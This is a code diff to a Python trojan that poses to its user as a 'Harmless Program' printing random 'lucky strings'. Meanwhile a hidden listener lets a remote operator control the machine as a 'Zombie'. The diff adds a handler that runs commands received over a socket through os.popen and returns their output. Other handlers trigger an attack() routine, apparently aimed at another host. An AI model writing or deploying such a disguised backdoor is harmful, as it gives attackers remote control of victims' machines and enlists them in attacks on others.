@@ -5,16 +5,17 @@ import threading
 from multiprocessing import Process
 import time
 import string
+import os
 import socket 
 import random 
 
 # Edit these values
 # SRC = victim
-# TARGET = attacker, yeah I interchanged them somehow my bad
+# TARGET = attacker
 
-SRC_IP = "192.168.1.5" 
+SRC_IP = "192.168.1.4" 
 SRC_PORT = 7777
-TARGET_IP = "192.168.1.7"
+TARGET_IP = "192.168.1.5"
 TARGET_PORT = 4000 
 
 count = 0
@@ -37,12 +38,18 @@ def normal():
     print("\n")
     print("#"*12+" Welcome to Harmless Program "+"#"*12)
     print('\n')
+    print("YOUR LUCKY STRING ==> KIlOpuHjEr")
+    print("If you find it within 5 minutes, your day will be lucky!")
+    print('\n')
     print("This is talkative program and will keep printing random text unless stopped with Ctrl+C...")
     while True:
         ran = ''.join(random.choices(string.ascii_uppercase + string.digits, k = 10)) 
-        print("Do you know what is "+ran+"????")
+        print('\n')
+        print("="*15)
+        print("Your String ==> "+ran)
         print("Sleeping for 3 seconds am tired...")
         time.sleep(3)     
+        print("You are quite unlucky if you still didn't find your string!")
 
 def attack():
     count = 0
@@ -57,24 +64,39 @@ def secret():
     PORT = SRC_PORT
     flag = 1
     
-    while flag==1:
+    while True:
         with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
             s.bind((HOST, PORT))
             s.listen()
             conn, addr = s.accept()
             with conn:
-                while flag ==1:
+                while True:
                     data = conn.recv(1024)
                     if not data:
                         break
-                    elif "Stop" in repr(data):
-                        conn.sendall('Closing the connection...'.encode('utf-8'))
-                        conn.close()
-                        flag = 0
+                    elif "Command" in repr(data):
+                        cmd = repr(data)
+                        start = cmd.find("#")+1
+                        end = cmd.find("$")
+                        stream = os.popen(cmd[start:end])
+                        output = ""
+                        output = stream.read()
+                        if "not recognized" in output:
+                            conn.sendall("Command not found..".encode('utf-8'))
+                            s.close()
+                        elif output == "":
+                            conn.sendall("Command successful but returned no output.".encode('utf-8'))
+                            s.close()
+                        else:
+                            conn.sendall(output.encode('utf-8'))        
+                            s.close() 
                     elif "Commence" in repr(data):
+                        conn.sendall('The Zombie has initiated the attack and will be disconnected!'.encode('utf-8'))
+                        s.close()
                         attack()
                     elif "Check" in repr(data):
                         conn.sendall('The Zombie is Up and listening...'.encode('utf-8'))
+                        s.close()
                     else:
                         pass
         s.close()
